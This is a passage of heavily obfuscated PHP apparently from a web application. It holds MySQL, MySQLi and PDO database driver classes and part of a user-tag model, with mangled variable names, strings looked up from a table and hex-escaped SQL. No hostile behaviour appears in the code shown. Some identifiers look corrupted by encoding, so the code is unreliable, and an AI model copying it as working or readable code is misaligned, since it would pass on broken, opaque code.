$Õ÷Í÷ã) . $Ü³ˆŸÏ[930] . implode($Ü³ˆŸÏ[50], $óéô¸­à); return $this->execute($Îİ´Á); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $Ÿá¹‰©» =& $_SERVER[¡“ËÌ§œ]; $this->error = mysql_errno() . $Ÿá¹‰©»[4] . mysql_error($this->_linkID); if ($Ÿá¹‰©»[12] != $this->queryStr) { $this->error .= LNG($Ÿá¹‰©»[48]) . $this->queryStr; } think_trace($this->error, $Ÿá¹‰©»[12], $Ÿá¹‰©»[49]); return $this->error; } public function escapeString($ëÁÏ¥ö´) { if ($this->_linkID) { return mysql_real_escape_string($ëÁÏ¥ö´, $this->_linkID); } else { return mysql_escape_string($ëÁÏ¥ö´); } } public function parseKey(&$Œâ©´­, $â©í½”¦ = true) { $Ó÷ø‡äù =& $_SERVER[¡“ËÌ§œ]; if ($â©í½”¦) { $Œâ©´­ = $this->parseKeyCheck($Œâ©´­); } if ($Œâ©´­ != $Ó÷ø‡äù[189] && !preg_match($Ó÷ø‡äù[931], $Œâ©´­)) { $Œâ©´­ = $Ó÷ø‡äù[414] . trim($Œâ©´­, $Ó÷ø‡äù[414]) . $Ó÷ø‡äù[414]; } return $Œâ©´­; } } class DbMysqli extends Db { public function __construct($Ô¹°‘ = '') { $ıÇÇ´€‰ =& $_SERVER[¡“ËÌ§œ]; if (!extension_loaded($ıÇÇ´€‰[932])) { think_exception(think_lang($ıÇÇ´€‰[14]) . $ıÇÇ´€‰[933]); } if (!empty($Ô¹°‘)) { $this->config = $Ô¹°‘; if (empty($this->config[$ıÇÇ´€‰[17]])) { $this->config[$ıÇÇ´€‰[17]] = $ıÇÇ´€‰[12]; } } } public function connect($°ÀîÛÒª = '', $…—â‘—ñ = 0) { $àùè¬ïø =& $_SERVER[¡“ËÌ§œ]; if (!isset($this->linkID[$…—â‘—ñ])) { if (empty($°ÀîÛÒª)) { $°ÀîÛÒª = $this->config; } $this->linkID[$…—â‘—ñ] = new mysqli($°ÀîÛÒª[$àùè¬ïø[906]], $°ÀîÛÒª[$àùè¬ïø[908]], $°ÀîÛÒª[$àùè¬ïø[909]], $°ÀîÛÒª[$àùè¬ïø[21]], $°ÀîÛÒª[$àùè¬ïø[907]] ? intval($°ÀîÛÒª[$àùè¬ïø[907]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $èÒéÖÕû = $this->linkID[$…—â‘—ñ]->server_version; $this->linkID[$…—â‘—ñ]->query($àùè¬ïø[910] . think_config($àùè¬ïø[911]) . $àùè¬ïø[58]); if ($èÒéÖÕû > $àùè¬ïø[912]) { $this->linkID[$…—â‘—ñ]->query($àùè¬ïø[913]); } $this->connected = !0; if (1 != think_config($àùè¬ïø[22])) { unset($this->config); } } return $this->linkID[$…—â‘—ñ]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($´áâ©ÕŸ) { $úŒê†²’ =& $_SERVER[¡“ËÌ§œ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $´áâ©ÕŸ; if ($this->queryID) { $this->free(); } think_action_status($úŒê†²’[23], 1); think_status($úŒê†²’[24]); $this->queryID = $this->_linkID->query($´áâ©ÕŸ); if ($this->_linkID->more_results()) { while (($ùÒ¼ ë˜ = $this->_linkID->next_result()) != NULL) { $ùÒ¼ ë˜->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($• ©¹¦á) { $˜£­ØÃ÷ =& $_SERVER[¡“ËÌ§œ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $• ©¹¦á; if ($this->queryID) { $this->free(); } think_action_status($˜£­ØÃ÷[25], 1); think_status($˜£­ØÃ÷[24]); $Åá‰“Ş = $this->_linkID->query($• ©¹¦á); $this->debug(); if (!1 === $Åá‰“Ş) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ì­õ«£ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$ì­õ«£) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ãıÙƒíï = $this->_linkID->rollback(); $this->transTimes = 0; if (!$ãıÙƒíï) { $this->error(); return !1; } } return !0; } private function getAll() { $øÕâë¸Ö = array(); if ($this->numRows > 0) { for ($©œ¢å´ = 0; $©œ¢å´ < $this->numRows; $©œ¢å´++) { $øÕâë¸Ö[$©œ¢å´] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $øÕâë¸Ö; } public function getFields($öƒÀ”ü³) { $®¢¯Íâ´ =& $_SERVER[¡“ËÌ§œ]; $èÅ‚‡ó“ = $this->query($®¢¯Íâ´[917] . $this->parseKey($öƒÀ”ü³)); $ƒşˆàÊÙ = array(); if ($èÅ‚‡ó“) { foreach ($èÅ‚‡ó“ as $€±ñğ«– => $şë½³‚) { $ƒşˆàÊÙ[$şë½³‚[$®¢¯Íâ´[31]]] = array($®¢¯Íâ´[32] => $şë½³‚[$®¢¯Íâ´[31]], $®¢¯Íâ´[33] => $şë½³‚[$®¢¯Íâ´[34]], $®¢¯Íâ´[35] => (bool) ($şë½³‚[$®¢¯Íâ´[36]] === $®¢¯Íâ´[12]), $®¢¯Íâ´[37] => $şë½³‚[$®¢¯Íâ´[38]], $®¢¯Íâ´[39] => strtolower($şë½³‚[$®¢¯Íâ´[40]]) == $®¢¯Íâ´[41], $®¢¯Íâ´[42] => strtolower($şë½³‚[$®¢¯Íâ´[43]]) == $®¢¯Íâ´[44]); } } return $ƒşˆàÊÙ; } public function getTables($½†«åà = '') { $Ëå½‚”î =& $_SERVER[¡“ËÌ§œ]; $õÍêÒ‚ö = !empty($½†«åà) ? $Ëå½‚”î[919] . $½†«åà . $Ëå½‚”î[920] : $Ëå½‚”î[921]; $ÁÎ¨‡ÔÓ = $this->query($õÍêÒ‚ö); $±äÑœ±² = array(); if ($ÁÎ¨‡ÔÓ) { foreach ($ÁÎ¨‡ÔÓ as $Ò€´ËÔ‹ => $æ²¬¬É°) { $±äÑœ±²[$Ò€´ËÔ‹] = current($æ²¬¬É°); } } return $±äÑœ±²; } public function replace($­‰µÅíé, $ÒØ»ªñ = array()) { $‰º„ç‚œ =& $_SERVER[¡“ËÌ§œ]; foreach ($­‰µÅíé as $–ø·ªáå => $èÇš¦¾æ) { $Ã„öâËâ = $this->parseValue($èÇš¦¾æ); if (is_scalar($Ã„öâËâ)) { $‘¼®Â[] = $Ã„öâËâ; $¬ÄÕĞÖœ[] = $this->parseKey($–ø·ªáå); } } $á¯½ÇŸ = $‰º„ç‚œ[922] . $this->parseTable($ÒØ»ªñ[$‰º„ç‚œ[308]]) . $‰º„ç‚œ[923] . implode($‰º„ç‚œ[50], $¬ÄÕĞÖœ) . $‰º„ç‚œ[924] . implode($‰º„ç‚œ[50], $‘¼®Â) . $‰º„ç‚œ[925]; return $this->execute($á¯½ÇŸ); } public function insertAll($–Êïíê¾, $‘ñèÎ‚ = array(), $Àª”†¶‹ = false) { $€ê×ïˆ =& $_SERVER[¡“ËÌ§œ]; if (!is_array($–Êïíê¾[0])) { return !1; } $Ì¨“ÖÌĞ = array_keys($–Êïíê¾[0]); $ğíûâÑë = array(); foreach ($–Êïíê¾ as $şÏ®Ûâ) { $Ô®¤Ò›Ş = array(); foreach ($şÏ®Ûâ as $Şò¾ê» => $°¼ÁùªĞ) { $°¼ÁùªĞ = $this->parseValue($°¼ÁùªĞ); if (is_scalar($°¼ÁùªĞ)) { $Ô®¤Ò›Ş[] = $°¼ÁùªĞ; } } $ğíûâÑë[] = $€ê×ïˆ[289] . implode($€ê×ïˆ[50], $Ô®¤Ò›Ş) . $€ê×ïˆ[925]; } array_walk($Ì¨“ÖÌĞ, array($this, $€ê×ïˆ[926])); $´ÚÔÃ‘‚ = $Àª”†¶‹ ? $€ê×ïˆ[927] : $€ê×ïˆ[928]; $ÓâôÆÓÌ = $´ÚÔÃ‘‚ . $€ê×ïˆ[929] . $this->parseTable($‘ñèÎ‚[$€ê×ïˆ[308]]) . $€ê×ïˆ[923] . implode($€ê×ïˆ[50], $Ì¨“ÖÌĞ) . $€ê×ïˆ[930] . implode($€ê×ïˆ[50], $ğíûâÑë); return $this->execute($ÓâôÆÓÌ); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $º£è¾…± =& $_SERVER[¡“ËÌ§œ]; $this->error = $this->_linkID->errno . $º£è¾…±[4] . $this->_linkID->error; if ($º£è¾…±[12] != $this->queryStr) { $this->error .= LNG($º£è¾…±[48]) . $this->queryStr; } think_trace($this->error, $º£è¾…±[12], $º£è¾…±[49]); return $this->error; } public function escapeString($¥Ëß¦Åì) { if ($this->_linkID) { return $this->_linkID->real_escape_string($¥Ëß¦Åì); } else { return addslashes($¥Ëß¦Åì); } } public function parseKey(&$£ğ‹­ÂÑ, $Ö€±»ıÈ = true) { $Âê†È¯ =& $_SERVER[¡“ËÌ§œ]; if ($Ö€±»ıÈ) { $£ğ‹­ÂÑ = $this->parseKeyCheck($£ğ‹­ÂÑ); } if ($£ğ‹­ÂÑ != $Âê†È¯[189] && !preg_match($Âê†È¯[931], $£ğ‹­ÂÑ)) { $£ğ‹­ÂÑ = $Âê†È¯[414] . trim($£ğ‹­ÂÑ, $Âê†È¯[414]) . $Âê†È¯[414]; } return $£ğ‹­ÂÑ; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($°¦¡®»– = '') { $µİ‚–…´ =& $_SERVER[¡“ËÌ§œ]; if (!class_exists($µİ‚–…´[934])) { think_exception(think_lang($µİ‚–…´[14]) . $µİ‚–…´[935]); } if (!empty($°¦¡®»–)) { $this->config = $°¦¡®»–; if (empty($this->config[$µİ‚–…´[17]])) { $this->config[$µİ‚–…´[17]] = array(); } } } public function connect($Ä½¯‚ = '', $ß‘Ùõ½ = 0) { $äİòâ‚ =& $_SERVER[¡“ËÌ§œ]; if (!isset($this->linkID[$ß‘Ùõ½])) { if (empty($Ä½¯‚)) { $Ä½¯‚ = $this->config; } $Âß˜…Õø = !empty($Ä½¯‚[$äİòâ‚[17]][$äİòâ‚[18]]) ? $Ä½¯‚[$äİòâ‚[17]][$äİòâ‚[18]] : $this->pconnect; if ($Âß˜…Õø) { $Ä½¯‚[$äİòâ‚[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$ß‘Ùõ½] = new PDO($Ä½¯‚[$äİòâ‚[936]], $Ä½¯‚[$äİòâ‚[908]], $Ä½¯‚[$äİòâ‚[909]], $Ä½¯‚[$äİòâ‚[17]]); } catch (PDOException $—ŸÚ°Äí) { think_exception($—ŸÚ°Äí->getMessage()); } $this->dbType = $this->_getDsnType($Ä½¯‚[$äİòâ‚[936]]); if (in_array($this->dbType, array($äİòâ‚[937], $äİòâ‚[938], $äİòâ‚[939], $äİòâ‚[940]))) { think_exception($äİòâ‚[941] . $this->dbType . $äİòâ‚[942] . $this->dbType . $äİòâ‚[943]); } if (!$this->linkID[$ß‘Ùõ½]) { think_exception($äİòâ‚[944]); } try { $this->linkID[$ß‘Ùõ½]->exec($äİòâ‚[945] . think_config($äİòâ‚[911])); } catch (Exception $—ŸÚ°Äí) { } $this->connected = !0; if (1 != think_config($äİòâ‚[22])) { unset($this->config); } } return $this->linkID[$ß‘Ùõ½]; } public function free() { $this->PDOStatement = null; } public function query($Ğ´Á›Ùı, $°Ò“¥ùê = array()) { $¹±îô‚” =& $_SERVER[¡“ËÌ§œ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Ğ´Á›Ùı; if (!empty($°Ò“¥ùê)) { $this->queryStr .= $¹±îô‚”[946] . print_r($°Ò“¥ùê, !0) . $¹±îô‚”[947]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($¹±îô‚”[23], 1); think_status($¹±îô‚”[24]); $this->PDOStatement = $this->_linkID->prepare($Ğ´Á›Ùı); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $‡¡àÌíë = $this->PDOStatement->execute($°Ò“¥ùê); $this->debug(); if (!1 === $‡¡àÌíë) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($Ò«Ó¸•µ, $Ÿş‘‰Äº = array()) { $€—š×Ÿ =& $_SERVER[¡“ËÌ§œ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Ò«Ó¸•µ; if (!empty($Ÿş‘‰Äº)) { $this->queryStr .= $€—š×Ÿ[946] . print_r($Ÿş‘‰Äº, !0) . $€—š×Ÿ[947]; } $ÛÓğÀ·† = !1; if ($this->dbType == $€—š×Ÿ[940]) { if (preg_match($€—š×Ÿ[948], $this->queryStr, $“ÅŒöŒ)) { $this->table = think_config($€—š×Ÿ[949]) . str_ireplace(think_config($€—š×Ÿ[950]), $€—š×Ÿ[407], $“ÅŒöŒ[2]); $ÛÓğÀ·† = (bool) $this->query($€—š×Ÿ[951] . strtoupper($this->table) . $€—š×Ÿ[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($€—š×Ÿ[25], 1); think_status($€—š×Ÿ[24]); $this->PDOStatement = $this->_linkID->prepare($Ò«Ó¸•µ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $›ñÖïŠ’ = $this->PDOStatement->execute($Ÿş‘‰Äº); $this->debug(); if (!1 === $›ñÖïŠ’) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($ÛÓğÀ·† || preg_match($€—š×Ÿ[952], $Ò«Ó¸•µ)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $¤âô‡±á = $this->_linkID->commit(); $this->transTimes = 0; if (!$¤âô‡±á) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $’ Ï¾ÄÒ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$’ Ï¾ÄÒ) { $this->error(); return !1; } } return !0; } private function getAll() { $ß´ª±¦â = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($ß´ª±¦â); return $ß´ª±¦â; } public function getFields($ß¶¢àÖŒ) { $ÒîÄ¾¸¿ =& $_SERVER[¡“ËÌ§œ]; $this->initConnect(!0); if (think_config($ÒîÄ¾¸¿[953])) { $Ş®×Œ’¡ = str_replace($ÒîÄ¾¸¿[954], $ß¶¢àÖŒ, think_config($ÒîÄ¾¸¿[953])); } else { switch ($this->dbType) { case $ÒîÄ¾¸¿[937]: case $ÒîÄ¾¸¿[955]: $Ş®×Œ’¡ = "\123\105\114\x45\103\x54\x20\40\40\x63\x6f\154\x75\155\156\137\156\x61\155\145\40\141\163\40\x27\x4e\141\155\x65\47\54\40\x20\40\x64\x61\164\141\x5f\164\171\160\145\x20\x61\x73\40\47\x54\x79\x70\145\47\x2c\40\x20\40\143\x6f\154\x75\x6d\156\x5f\x64\x65\146\141\x75\x6c\x74\x20\x61\x73\40\x27\x44\145\146\141\x75\154\x74\x27\x2c\40\40\x20\151\x73\x5f\x6e\165\x6c\154\x61\142\x6c\145\40\x61\163\40\47\x4e\165\x6c\x6c\x27\12\x9\11\x46\122\x4f\x4d\x9\151\156\x66\157\162\155\x61\x74\x69\x6f\156\x5f\163\x63\150\145\x6d\x61\56\164\x61\x62\x6c\x65\163\40\x41\123\x20\x74\xa\11\11\x4a\x4f\111\116\x9\151\x6e\x66\157\x72\155\141\164\151\x6f\x6e\137\163\x63\x68\145\155\x61\56\x63\x6f\154\x75\155\156\163\40\101\x53\40\x63\12\x9\x9\x4f\116\40\x20\x74\x2e\x74\141\142\154\x65\137\143\x61\x74\x61\154\x6f\x67\x20\x3d\40\x63\x2e\x74\x61\x62\154\x65\x5f\143\x61\164\141\x6c\x6f\147\12\11\11\101\x4e\x44\40\164\x2e\x74\x61\142\154\145\x5f\x73\143\x68\145\x6d\x61\40\75\40\143\56\164\141\x62\x6c\x65\137\163\143\150\145\x6d\x61\12\11\x9\x41\116\104\40\164\56\164\x61\142\154\145\x5f\156\x61\x6d\x65\40\x3d\40\x63\56\164\x61\142\154\145\x5f\156\x61\155\145\12\x9\x9\127\x48\105\122\105\40\40\40\x74\56\164\141\142\x6c\x65\x5f\156\141\155\x65\x20\x3d\x20\x27{$ß¶¢àÖŒ}\47"; break; case $ÒîÄ¾¸¿[956]: $Ş®×Œ’¡ = $ÒîÄ¾¸¿[957] . $ß¶¢àÖŒ . $ÒîÄ¾¸¿[958]; break; case $ÒîÄ¾¸¿[938]: case $ÒîÄ¾¸¿[940]: $Ş®×Œ’¡ = $ÒîÄ¾¸¿[959] . $ÒîÄ¾¸¿[960] . $ÒîÄ¾¸¿[961] . strtoupper($ß¶¢àÖŒ) . $ÒîÄ¾¸¿[962] . strtoupper($ß¶¢àÖŒ) . $ÒîÄ¾¸¿[963]; break; case $ÒîÄ¾¸¿[964]: $Ş®×Œ’¡ = $ÒîÄ¾¸¿[965] . $ß¶¢àÖŒ . $ÒîÄ¾¸¿[966]; break; case $ÒîÄ¾¸¿[939]: break; case $ÒîÄ¾¸¿[967]: default: $Ş®×Œ’¡ = $ÒîÄ¾¸¿[968] . ($this->dbType == $ÒîÄ¾¸¿[967] ? "\x60{$ß¶¢àÖŒ}\x60" : $ß¶¢àÖŒ); } } $öú¹Ãê = $this->query($Ş®×Œ’¡); $ãÌÜĞ¼‘ = array(); if ($öú¹Ãê) { foreach ($öú¹Ãê as $ˆ¼ùÎğ => $¸ØÑŞÁ) { $¸ØÑŞÁ = array_change_key_case($¸ØÑŞÁ); $¸ØÑŞÁ[$ÒîÄ¾¸¿[32]] = isset($¸ØÑŞÁ[$ÒîÄ¾¸¿[32]]) ? $¸ØÑŞÁ[$ÒîÄ¾¸¿[32]] : $ÒîÄ¾¸¿[407]; $¸ØÑŞÁ[$ÒîÄ¾¸¿[33]] = isset($¸ØÑŞÁ[$ÒîÄ¾¸¿[33]]) ? $¸ØÑŞÁ[$ÒîÄ¾¸¿[33]] : $ÒîÄ¾¸¿[407]; $—¼÷ÂåÅ = isset($¸ØÑŞÁ[$ÒîÄ¾¸¿[302]]) ? $¸ØÑŞÁ[$ÒîÄ¾¸¿[302]] : $¸ØÑŞÁ[$ÒîÄ¾¸¿[32]]; $ãÌÜĞ¼‘[$—¼÷ÂåÅ] = array($ÒîÄ¾¸¿[32] => $—¼÷ÂåÅ, $ÒîÄ¾¸¿[33] => $¸ØÑŞÁ[$ÒîÄ¾¸¿[33]], $ÒîÄ¾¸¿[35] => (bool) (isset($¸ØÑŞÁ[$ÒîÄ¾¸¿[103]]) && $¸ØÑŞÁ[$ÒîÄ¾¸¿[103]] === $ÒîÄ¾¸¿[12] || isset($¸ØÑŞÁ[$ÒîÄ¾¸¿[35]]) && $¸ØÑŞÁ[$ÒîÄ¾¸¿[35]] === $ÒîÄ¾¸¿[12]), $ÒîÄ¾¸¿[37] => isset($¸ØÑŞÁ[$ÒîÄ¾¸¿[37]]) ? $¸ØÑŞÁ[$ÒîÄ¾¸¿[37]] : (isset($¸ØÑŞÁ[$ÒîÄ¾¸¿[56]]) ? $¸ØÑŞÁ[$ÒîÄ¾¸¿[56]] : $ÒîÄ¾¸¿[407]), $ÒîÄ¾¸¿[39] => isset($¸ØÑŞÁ[$ÒîÄ¾¸¿[94]]) ? strtolower($¸ØÑŞÁ[$ÒîÄ¾¸¿[94]]) == $ÒîÄ¾¸¿[41] : (isset($¸ØÑŞÁ[$ÒîÄ¾¸¿[57]]) ? $¸ØÑŞÁ[$ÒîÄ¾¸¿[57]] : !1), $ÒîÄ¾¸¿[42] => isset($¸ØÑŞÁ[$ÒîÄ¾¸¿[969]]) ? strtolower($¸ØÑŞÁ[$ÒîÄ¾¸¿[969]]) == $ÒîÄ¾¸¿[44] : (isset($¸ØÑŞÁ[$ÒîÄ¾¸¿[94]]) ? $¸ØÑŞÁ[$ÒîÄ¾¸¿[94]] : !1)); } } return $ãÌÜĞ¼‘; } public function getTables($ƒÕÀäŒ¨ = '') { $¾¼‰ƒ… =& $_SERVER[¡“ËÌ§œ]; if (think_config($¾¼‰ƒ…[970])) { $› ûå»Ä = str_replace($¾¼‰ƒ…[971], $ƒÕÀäŒ¨, think_config($¾¼‰ƒ…[970])); } else { switch ($this->dbType) { case $¾¼‰ƒ…[938]: case $¾¼‰ƒ…[940]: $› ûå»Ä = $¾¼‰ƒ…[972]; break; case $¾¼‰ƒ…[937]: case $¾¼‰ƒ…[955]: $› ûå»Ä = $¾¼‰ƒ…[973]; break; case $¾¼‰ƒ…[964]: $› ûå»Ä = $¾¼‰ƒ…[974]; break; case $¾¼‰ƒ…[939]: think_exception(think_lang($¾¼‰ƒ…[975]) . $¾¼‰ƒ…[976]); break; case $¾¼‰ƒ…[956]: $› ûå»Ä = $¾¼‰ƒ…[45] . $¾¼‰ƒ…[46] . $¾¼‰ƒ…[47]; break; case $¾¼‰ƒ…[967]: default: if (!empty($ƒÕÀäŒ¨)) { $› ûå»Ä = $¾¼‰ƒ…[919] . $ƒÕÀäŒ¨ . $¾¼‰ƒ…[920]; } else { $› ûå»Ä = $¾¼‰ƒ…[921]; } } } $ô•É‘¦ó = $this->query($› ûå»Ä); $†úÓîí = array(); foreach ($ô•É‘¦ó as $ØùÔãÕÏ => $â™ñşªû) { $†úÓîí[$ØùÔãÕÏ] = current($â™ñşªû); } return $†úÓîí; } protected function parseLimit($Ñ‡â»ü) { $Ê øö =& $_SERVER[¡“ËÌ§œ]; $âšçÈÕª = $Ê øö[12]; if (!empty($Ñ‡â»ü)) { switch ($this->dbType) { case $Ê øö[964]: case $Ê øö[956]: $Ñ‡â»ü = explode($Ê øö[50], $Ñ‡â»ü); if (count($Ñ‡â»ü) > 1) { $âšçÈÕª .= $Ê øö[51] . $Ñ‡â»ü[1] . $Ê øö[52] . $Ñ‡â»ü[0] . $Ê øö[53]; } else { $âšçÈÕª .= $Ê øö[51] . $Ñ‡â»ü[0] . $Ê øö[53]; } break; case $Ê øö[937]: case $Ê øö[955]: break; case $Ê øö[939]: break; case $Ê øö[938]: case $Ê øö[940]: break; case $Ê øö[967]: default: $âšçÈÕª .= $Ê øö[51] . $Ñ‡â»ü . $Ê øö[53]; } } return $âšçÈÕª; } public function parseKey(&$ÜêÙİŸó, $Èİ§½š = true) { $Ãæ¥‘ÍÒ =& $_SERVER[¡“ËÌ§œ]; if ($Èİ§½š) { $ÜêÙİŸó = $this->parseKeyCheck($ÜêÙİŸó); } if ($this->dbType == $Ãæ¥‘ÍÒ[967]) { if ($ÜêÙİŸó != $Ãæ¥‘ÍÒ[189] && !preg_match($Ãæ¥‘ÍÒ[931], $ÜêÙİŸó)) { $ÜêÙİŸó = $Ãæ¥‘ÍÒ[414] . trim($ÜêÙİŸó, $Ãæ¥‘ÍÒ[414]) . $Ãæ¥‘ÍÒ[414]; } return $ÜêÙİŸó; } else { return parent::parseKey($ÜêÙİŸó, $Èİ§½š); } } public function close() { $this->_linkID = null; } public function error() { $”Ş¾Ş™´ =& $_SERVER[¡“ËÌ§œ]; if ($this->PDOStatement) { $ì€¯ªÂ– = $this->PDOStatement->errorInfo(); $this->error = $ì€¯ªÂ–[1] . $”Ş¾Ş™´[4] . $ì€¯ªÂ–[2]; } else { $this->error = $”Ş¾Ş™´[12]; } if ($”Ş¾Ş™´[12] != $this->queryStr) { $this->error .= LNG($”Ş¾Ş™´[48]) . $this->queryStr; } think_trace($this->error, $”Ş¾Ş™´[12], $”Ş¾Ş™´[49]); return $this->error; } public function escapeString($Äæ½¡Ôá) { $›÷ºâ½© =& $_SERVER[¡“ËÌ§œ]; switch ($this->dbType) { case $›÷ºâ½©[964]: case $›÷ºâ½©[937]: case $›÷ºâ½©[955]: case $›÷ºâ½©[967]: return addslashes($Äæ½¡Ôá); case $›÷ºâ½©[939]: case $›÷ºâ½©[956]: case $›÷ºâ½©[938]: case $›÷ºâ½©[940]: return str_ireplace($›÷ºâ½©[58], $›÷ºâ½©[59], $Äæ½¡Ôá); } } protected function parseValue($”©·´î ) { $óóÛ‚ëÇ =& $_SERVER[¡“ËÌ§œ]; if (is_string($”©·´î )) { $Ó÷³²É¸ = strpos($”©·´î , $óóÛ‚ëÇ[4]) === 0 && in_array($”©·´î , array_keys($this->bind)); $”©·´î  = $Ó÷³²É¸ ? $this->escapeString($”©·´î ) : $óóÛ‚ëÇ[977] . $this->escapeString($”©·´î ) . $óóÛ‚ëÇ[977]; } elseif (isset($”©·´î [0]) && is_string($”©·´î [0]) && strtolower($”©·´î [0]) == $óóÛ‚ëÇ[326]) { $”©·´î  = $this->escapeString($”©·´î [1]); } elseif (is_array($”©·´î )) { $”©·´î  = array_map(array($this, $óóÛ‚ëÇ[978]), $”©·´î ); } elseif (is_bool($”©·´î )) { $”©·´î  = $”©·´î  ? $óóÛ‚ëÇ[88] : $óóÛ‚ëÇ[198]; } elseif (is_null($”©·´î )) { $”©·´î  = $óóÛ‚ëÇ[103]; } return $”©·´î ; } public function getLastInsertId() { $á™üÜ¿‘ =& $_SERVER[¡“ËÌ§œ]; switch ($this->dbType) { case $á™üÜ¿‘[964]: case $á™üÜ¿‘[956]: case $á™üÜ¿‘[937]: case $á™üÜ¿‘[955]: case $á™üÜ¿‘[939]: case $á™üÜ¿‘[967]: return $this->_linkID->lastInsertId(); case $á™üÜ¿‘[938]: case $á™üÜ¿‘[940]: $¥…ß˜ü¹ = $this->table; $‚ñÛî· = $this->query("\123\105\114\105\x43\x54\40{$¥…ß˜ü¹}\x2e\x63\x75\x72\162\x76\141\154\x20\x63\x75\162\162\x76\x61\x6c\x20\106\x52\117\x4d\40\x64\x75\141\x6c"); return $‚ñÛî· ? $‚ñÛî·[0][$á™üÜ¿‘[979]] : 0; } } } goto CßÇÂé‡­; D«¨‚ÔİŸª: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\163\145\x72\137\x66\141\x76"; protected function cacheFunctionAlias($şóë¯Ê) { $äµğòë² =& $_SERVER[¡“ËÌ§œ]; return array($äµğòë²[1962] => array($äµğòë²[2348] . USER_ID, $äµğòë²[1963])); } protected function listData() { $ê¼Ïêìİ =& $_SERVER[¡“ËÌ§œ]; $Îª¶¸ß« = array($ê¼Ïêìİ[1652] => USER_ID, $ê¼Ïêìİ[521] => array($ê¼Ïêìİ[1966], 0)); $Šñ£•ƒ¹ = $ê¼Ïêìİ[2349]; $‹î•¬ÉÌ = $this->field($Šñ£•ƒ¹)->where($Îª¶¸ß«)->order($ê¼Ïêìİ[1969])->select(); return $‹î•¬ÉÌ ? $‹î•¬ÉÌ : array(); } protected function addToTag($¬êªï, $°ıµÒŠ¨) { $¹Ø¬úÖˆ =& $_SERVER[¡“ËÌ§œ]; if (!Model($¹Ø¬úÖˆ[2111])->listData($°ıµÒŠ¨)) { return !1; } if (is_numeric($¬êªï)) { $çç¢ë‹ƒ = Model($¹Ø¬úÖˆ[845])->pathInfo($¬êªï); if (!$çç¢ë‹ƒ) { return !1; } } else { $çç¢ë‹ƒ = IO::infoSimple($¬êªï); if (!$çç¢ë‹ƒ) { return !1; } $¶¯‘°³ = $çç¢ë‹ƒ[$¹Ø¬úÖˆ[32]]; $Ùû€››˜ = $çç¢ë‹ƒ[$¹Ø¬úÖˆ[33]]; if (isset($çç¢ë‹ƒ[$¹Ø¬úÖˆ[448]])) { $Ùû€››˜ = $çç¢ë‹ƒ[$¹Ø¬úÖˆ[448]] == $¹Ø¬úÖˆ[88] ? $¹Ø¬úÖˆ[75] : $¹Ø¬úÖˆ[200]; } } $©ÓÏ‚ˆ¤ = array($¹Ø¬úÖˆ[1652] => USER_ID, $¹Ø¬úÖˆ[521] => $°ıµÒŠ¨, $¹Ø¬úÖˆ[459] => $¬êªï, $¹Ø¬úÖˆ[460] => $Ùû€››˜ ? $Ùû€››˜ : $¹Ø¬úÖˆ[454], $¹Ø¬úÖˆ[458] => $¶¯‘°³ ? $¶¯‘°³ : $¹Ø¬úÖˆ[12], $¹Ø¬úÖˆ[1855] => 0); if ($this->where($©ÓÏ‚ˆ¤)->find()) { return !1; } return $this->add($©ÓÏ‚ˆ¤); } protected function removeFromTag($ŠõÉ†õğ, $öµÎÇšã) { $ÙÒá×´Ü =& $_SERVER[¡“ËÌ§œ]; if (!Model($ÙÒá×´Ü[2111])->listData($öµÎÇšã)) { return !1; } if (is_array($ŠõÉ†õğ)) { $ŠõÉ†õğ = array($ÙÒá×´Ü[7], $ŠõÉ†õğ); } $úŒ­âğ = array($ÙÒá×´Ü[1652] => USER_ID, $ÙÒá×´Ü[521] => $öµÎÇšã, $ÙÒá×´Ü[459] => $ŠõÉ†õğ); return $this->where($úŒ­âğ)->delete(); } protected function removeByTag($ÖÛËı¾·) { $ê­ÛÏô± =& $_SERVER[¡“ËÌ§œ]; if (!$ÖÛËı¾·) { return !1; } $±¨šÏúâ = array($ê­ÛÏô±[1652] => USER_ID, $ê­ÛÏô±[521] => $ÖÛËı¾·); return $this->where($±¨šÏúâ)->delete(); } protected function removeBySource($˜ÉÍÄ¹œ) { $¨î«£Š  =& $_SERVER[¡“ËÌ§œ]; if (is_array($˜ÉÍÄ¹œ)) { $˜ÉÍÄ¹œ = array($¨î«£Š [7], $˜ÉÍÄ¹œ); } $ÍÍíåÕ– = 